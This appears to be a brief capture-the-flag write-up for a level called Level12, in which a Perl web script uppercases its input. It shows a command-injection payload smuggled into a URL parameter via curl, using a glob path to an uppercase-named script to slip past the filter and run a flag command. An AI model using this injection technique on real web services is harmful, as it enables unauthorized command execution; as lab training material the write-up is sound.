# Level12

Perl again... But this the script will change to uppercase any character we input. To bypass this we'll create a script with an uppercase name.
>`echo '/bin/getflag > /tmp/flag' > /tmp/HACK && chmod 777 /tmp/HACK`

Let's send our query.
>`curl 'localhost:4646/?x=$(/*/HACK)'`

Get the flag.
>`cat /tmp/flag`
